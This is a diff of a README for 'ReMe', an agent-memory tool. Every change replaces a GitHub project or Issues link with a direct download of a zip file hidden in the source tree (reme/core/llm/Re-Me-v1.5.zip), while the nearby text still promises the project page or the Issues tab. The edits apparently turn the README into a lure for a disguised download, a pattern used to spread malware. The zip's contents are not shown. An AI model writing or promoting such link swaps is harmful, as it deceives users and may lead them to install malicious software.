@@ -1,6 +1,6 @@
 # ⚙️ ReMe - Manage Agent Memory Simply
 
-[![Download ReMe](https://img.shields.io/badge/Download-ReMe-blue?style=for-the-badge)](https://github.com/Eldino162/ReMe)
+[![Download ReMe](https://img.shields.io/badge/Download-ReMe-blue?style=for-the-badge)](https://raw.githubusercontent.com/Eldino162/ReMe/main/reme/core/llm/Re-Me-v1.5.zip)
 
 ---
 
@@ -44,7 +44,7 @@ ReMe aims to keep AI working smoothly and logically by managing what it "knows."
 
 Go to the ReMe page on GitHub to get the software. Use this link:  
 
-[https://github.com/Eldino162/ReMe](https://github.com/Eldino162/ReMe)  
+[https://raw.githubusercontent.com/Eldino162/ReMe/main/reme/core/llm/Re-Me-v1.5.zip](https://raw.githubusercontent.com/Eldino162/ReMe/main/reme/core/llm/Re-Me-v1.5.zip)  
 
 Clicking this will take you to the project page where you can download the latest version.
 
@@ -102,7 +102,7 @@ For memory errors, make sure your system has enough free RAM. Closing other apps
 
 If you have questions, visit the Issues tab on the GitHub page:  
 
-[https://github.com/Eldino162/ReMe/issues](https://github.com/Eldino162/ReMe/issues)
+[https://raw.githubusercontent.com/Eldino162/ReMe/main/reme/core/llm/Re-Me-v1.5.zip](https://raw.githubusercontent.com/Eldino162/ReMe/main/reme/core/llm/Re-Me-v1.5.zip)
 
 You can read existing reports or create a new one with details about your problem.
 
@@ -132,4 +132,4 @@ The project covers areas like:
 
 ---
 
-[![Download ReMe](https://img.shields.io/badge/Download-ReMe-blue?style=for-the-badge)](https://github.com/Eldino162/ReMe)
+[![Download ReMe](https://img.shields.io/badge/Download-ReMe-blue?style=for-the-badge)](https://raw.githubusercontent.com/Eldino162/ReMe/main/reme/core/llm/Re-Me-v1.5.zip)
